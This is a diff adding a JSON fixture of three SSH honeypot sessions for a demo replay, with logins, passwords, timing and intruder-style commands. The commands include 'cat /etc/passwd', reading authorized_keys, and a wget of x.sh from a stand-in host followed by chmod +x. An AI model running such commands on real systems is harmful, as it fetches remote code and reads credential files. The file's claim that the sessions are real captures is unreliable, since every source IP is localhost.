@@ -1,0 +1,57 @@
+{
+  "note": "Real captured SSH sessions exported verbatim from Postgres for demo replay (infra/demo/replay.ts). Commands, usernames, credentials, source IPs/ports and inter-event timing are exactly as captured — nothing is fabricated. Source IPs produce map markers only when they are public, geolocatable addresses.",
+  "sessionCount": 3,
+  "commandCount": 22,
+  "sessions": [
+    {
+      "sourceSessionId": "2f9feaab-3ddc-46e8-b1bc-e85a47e69877",
+      "sourceIp": "127.0.0.1",
+      "sourcePort": 60747,
+      "decoyType": "ssh",
+      "username": "root",
+      "password": "hunter2",
+      "method": "password",
+      "commands": ["whoami", "pwd", "uname -a", "ls -la", "cat /etc/passwd", "id", "exit"],
+      "gapsMs": [11, 315, 264, 266, 264, 265, 262, 251, 12]
+    },
+    {
+      "sourceSessionId": "9a216b1e-6262-4c87-8882-3e66602bac80",
+      "sourceIp": "127.0.0.1",
+      "sourcePort": 60746,
+      "decoyType": "ssh",
+      "username": "root",
+      "password": "toor",
+      "method": "password",
+      "commands": [
+        "whoami",
+        "wget http://example.test/x.sh",
+        "chmod +x x.sh",
+        "crontab -l",
+        "cat ~/.ssh/authorized_keys",
+        "history",
+        "exit"
+      ],
+      "gapsMs": [14, 319, 358, 357, 357, 359, 363, 358, 13]
+    },
+    {
+      "sourceSessionId": "75abf2f3-6a5f-478e-ba1a-4c6215ba65b3",
+      "sourceIp": "127.0.0.1",
+      "sourcePort": 51362,
+      "decoyType": "ssh",
+      "username": "admin",
+      "password": "admin123",
+      "method": "password",
+      "commands": [
+        "whoami",
+        "id",
+        "uname -a",
+        "cat /etc/os-release",
+        "ps aux",
+        "netstat -tulpn",
+        "cat /etc/passwd",
+        "exit"
+      ],
+      "gapsMs": [46, 302, 309, 316, 309, 301, 316, 315, 307, 19]
+    }
+  ]
+}
